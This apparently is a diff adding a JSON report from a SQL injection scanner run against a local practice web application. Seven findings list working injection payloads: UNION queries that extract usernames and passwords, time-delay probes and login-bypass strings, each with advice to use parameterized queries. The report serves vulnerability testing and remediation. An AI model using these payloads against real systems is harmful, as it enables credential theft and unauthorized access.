@@ -1,0 +1,65 @@
+[
+    {
+        "url": "http://localhost/vulnerabilities/sqli/",
+        "form_action": "http://localhost/vulnerabilities/sqli/",
+        "method": "get",
+        "vulnerable_input": "id",
+        "payload": "' UNION SELECT NULL,CONCAT(username,password) FROM users--",
+        "error_detected": "Database error message found in response",
+        "remediation": "Use parameterized queries (prepared statements) instead of string concatenation.\n\nExample in PHP with PDO:\n$stmt = $pdo->prepare('SELECT * FROM users WHERE id = ?');\n$stmt->execute([$id]);"
+    },
+    {
+        "url": "http://localhost/vulnerabilities/sqli/",
+        "form_action": "http://localhost/vulnerabilities/sqli/",
+        "method": "get",
+        "vulnerable_input": "id",
+        "payload": "1' AND (SELECT * FROM (SELECT(SLEEP(5)))test)--",
+        "error_detected": "Database error message found in response",
+        "remediation": "Use parameterized queries (prepared statements) instead of string concatenation.\n\nExample in PHP with PDO:\n$stmt = $pdo->prepare('SELECT * FROM users WHERE id = ?');\n$stmt->execute([$id]);"
+    },
+    {
+        "url": "http://localhost/vulnerabilities/sqli/",
+        "form_action": "http://localhost/vulnerabilities/sqli/",
+        "method": "get",
+        "vulnerable_input": "id",
+        "payload": "1' UNION SELECT NULL,version(),database()--",
+        "error_detected": "Database error message found in response",
+        "remediation": "Use parameterized queries (prepared statements) instead of string concatenation.\n\nExample in PHP with PDO:\n$stmt = $pdo->prepare('SELECT * FROM users WHERE id = ?');\n$stmt->execute([$id]);"
+    },
+    {
+        "url": "http://localhost/vulnerabilities/brute/",
+        "form_action": "http://localhost/vulnerabilities/brute/",
+        "method": "get",
+        "vulnerable_input": "username",
+        "payload": "' OR 1=1--",
+        "error_detected": "Database error message found in response",
+        "remediation": "Use parameterized queries (prepared statements) instead of string concatenation.\n\nExample in PHP with PDO:\n$stmt = $pdo->prepare('SELECT * FROM users WHERE id = ?');\n$stmt->execute([$id]);"
+    },
+    {
+        "url": "http://localhost/vulnerabilities/brute/",
+        "form_action": "http://localhost/vulnerabilities/brute/",
+        "method": "get",
+        "vulnerable_input": "username",
+        "payload": "admin'--",
+        "error_detected": "Database error message found in response",
+        "remediation": "Use parameterized queries (prepared statements) instead of string concatenation.\n\nExample in PHP with PDO:\n$stmt = $pdo->prepare('SELECT * FROM users WHERE id = ?');\n$stmt->execute([$id]);"
+    },
+    {
+        "url": "http://localhost/vulnerabilities/brute/",
+        "form_action": "http://localhost/vulnerabilities/brute/",
+        "method": "get",
+        "vulnerable_input": "username",
+        "payload": "'; WAITFOR DELAY '0:0:5'--",
+        "error_detected": "Database error message found in response",
+        "remediation": "Use parameterized queries (prepared statements) instead of string concatenation.\n\nExample in PHP with PDO:\n$stmt = $pdo->prepare('SELECT * FROM users WHERE id = ?');\n$stmt->execute([$id]);"
+    },
+    {
+        "url": "http://localhost/vulnerabilities/brute/",
+        "form_action": "http://localhost/vulnerabilities/brute/",
+        "method": "get",
+        "vulnerable_input": "username",
+        "payload": "1 UNION SELECT NULL, CONCAT(username, ':', password) FROM users--",
+        "error_detected": "Database error message found in response",
+        "remediation": "Use parameterized queries (prepared statements) instead of string concatenation.\n\nExample in PHP with PDO:\n$stmt = $pdo->prepare('SELECT * FROM users WHERE id = ?');\n$stmt->execute([$id]);"
+    }
+]
